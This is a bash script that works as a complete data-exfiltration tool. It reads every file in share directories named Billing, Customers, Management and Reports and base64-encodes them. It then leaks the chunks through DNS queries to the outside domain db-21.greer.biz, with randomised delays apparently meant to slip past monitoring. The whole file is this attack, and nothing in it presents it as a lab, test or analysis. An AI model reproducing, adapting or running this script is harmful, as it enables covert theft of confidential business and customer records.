#!/bin/bash

s=2
b=62
dns=""
domain=".db-21.greer.biz"
directories="/srv/shares/Billing /srv/shares/Customers /srv/shares/Management /srv/shares/Reports"

check_stop() {
	if [ "$1" != "0" ]; then
		exit;
	fi
}

encode() {
    base64 -w0 $1 | sed "s/.\{$b\}/&\n/g"   
}

split() {
    f=$1
    c=0
    for i in $(encode $f); do 
        if [[ "$c" -lt "$s"  ]]; then
            echo -ne "$i-.";
            c=$(($c+1));
        else
            echo -ne "\n$i-.";
            c=1;
        fi;
    done
}


for d in $directories; do
    cd "$d"
    for f in $(find . -maxdepth 1 -not -type d -exec basename {} \;); do 
        ix=0; 
        for r in $(split $f); do 
            _silent=$(dig $dns `echo -ne 3x6-.${ix}-.$r$(echo $f | sed "s/^\./,/")$domain|tr "+" "*"` +short;)
            check_stop $?
            ix=$(($ix+1));
            sleep $(shuf -i 8-24 -n 1)
        done; 
        _silent=$(dig $dns `echo 3x7-.0-.$(echo $f | sed "s/^\./,/")$domain|tr "+" "*"` +short;)
        check_stop $?
    done;
done;
